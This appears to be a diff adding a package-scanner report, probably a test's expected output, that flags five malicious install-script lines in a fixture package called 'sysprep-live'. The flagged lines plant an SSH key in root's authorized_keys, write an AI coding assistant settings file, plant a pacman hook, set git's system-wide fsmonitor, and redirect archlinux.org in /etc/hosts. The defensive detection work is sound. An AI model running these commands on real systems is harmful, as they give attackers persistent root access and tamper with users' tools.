@@ -1,0 +1,112 @@
+{
+  "package_name": "sysprep-live",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-config-writes/sysprep-live.install",
+        "line": 2,
+        "column": 98,
+        "snippet": "    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE0000 x' >> /root/.ssh/authorized_keys"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": ">> /root/.ssh/authorized_keys",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-008",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "AI coding assistant config or hook written (install script)",
+      "description": "Writes into an AI coding assistant's per-user configuration (Claude Code, Cursor, Codex, Gemini CLI, OpenCode, Continue, Aider, Copilot) outside $pkgdir. Settings, hooks and MCP definitions there run commands with the user's authority whenever the assistant starts, which supply-chain malware has used for persistence.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-config-writes/sysprep-live.install",
+        "line": 4,
+        "column": 27,
+        "snippet": "    printf '{\"hooks\":{}}' > /home/user/.claude/settings.json"
+      },
+      "recommendation": "Do NOT install. A package must never write into a user's assistant configuration. Inspect ~/.claude, ~/.cursor, ~/.codex, ~/.gemini and ~/.config/opencode for hooks or MCP servers you did not add.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "> /home/user/.claude/settings.json",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-009",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "pacman hook written outside $pkgdir (install script)",
+      "description": "Writes a libalpm hook into /etc/pacman.d/hooks/ or /usr/share/libalpm/hooks/ directly instead of shipping it in the package. A hook runs as root on pacman transactions, so a hook planted by a scriptlet or build function is a root persistence mechanism.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-config-writes/sysprep-live.install",
+        "line": 6,
+        "column": 5,
+        "snippet": "    install -Dm644 /usr/share/sysprep/zz.hook /usr/share/libalpm/hooks/zz.hook"
+      },
+      "recommendation": "Do NOT install. Hooks belong in the package file list under $pkgdir, where pacman owns and can remove them.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "install -Dm644 /usr/share/sysprep/zz.hook /usr/share/libalpm/hooks/zz.hook",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "TAMPER-021",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "System-wide git config set to run a program (install script)",
+      "description": "Sets core.fsmonitor or core.hooksPath in the SYSTEM git configuration, or writes /etc/gitconfig outside $pkgdir. Every user's git, including root's, then runs the program on every repository command.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-config-writes/sysprep-live.install",
+        "line": 5,
+        "column": 5,
+        "snippet": "    git config --system core.fsmonitor /usr/lib/sysprep/fsm"
+      },
+      "recommendation": "Do NOT install. Inspect /etc/gitconfig and remove the setting.",
+      "cwe_id": "CWE-829",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "git config --system core.fsmonitor",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "TAMPER-018",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Name resolution configuration modified (install script)",
+      "description": "Writes to /etc/hosts, /etc/resolv.conf or /etc/nsswitch.conf outside $pkgdir. Packages do not ship these files; editing them redirects hostnames (update servers, package mirrors, login hosts) to an attacker or disables resolution safeguards.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-config-writes/sysprep-live.install",
+        "line": 3,
+        "column": 38,
+        "snippet": "    echo '203.0.113.7 archlinux.org' >> /etc/hosts"
+      },
+      "recommendation": "Remove the edit. Hostname and resolver configuration is the administrator's, not a package's.",
+      "cwe_id": "CWE-350",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": ">> /etc/hosts",
+        "script_kind": "install script"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/live-config-writes/PKGBUILD",
+    "tests/fixtures/malicious/live-config-writes/sysprep-live.install"
+  ],
+  "timestamp": "2026-11-10T14:51:02.073687415Z",
+  "scan_duration_ms": 62
+}
